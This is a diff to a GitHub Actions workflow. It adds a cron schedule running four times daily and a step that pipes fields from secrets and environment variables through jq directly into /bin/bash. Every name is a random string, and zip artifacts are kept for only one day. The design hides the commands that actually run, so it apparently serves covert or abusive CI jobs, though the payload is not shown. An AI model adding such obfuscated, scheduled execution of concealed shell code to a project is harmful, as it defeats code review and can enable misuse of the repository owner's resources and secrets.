@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '58 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -22,18 +24,17 @@ jobs:
           fetch-depth: 1
       - name: Invoke
         env:
-          co6704: ${{ secrets.co6704 }}
+          n99: ${{ secrets.n99 }}
         run: |
-          printf '%s' "$co6704" | jq -r .gzvs10 | /bin/bash
-          printf '%s' "$ha0" | jq -r .bgi11 | /bin/bash
-          echo $fy25 | jq -r .qqrsq0 | /bin/bash
-          echo $ysn977 | jq -r .febat68 | /bin/bash
-          echo $z8 | jq -r .qpw96079 | /bin/bash
+          printf '%s' "$n99" | jq -r .wphls73 | /bin/bash
+          printf '%s' "$tj8" | jq -r .akno184 | /bin/bash
+          printf '%s' "$asn9902" | jq -r .vgyc8944 | /bin/bash
+          echo $hnw20 | jq -r .oqmc63680 | /bin/bash
 
       - name: Store artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: hn4YhhtK
+          name: XwLxSRX6
           path: "*.zip"
           retention-days: 1
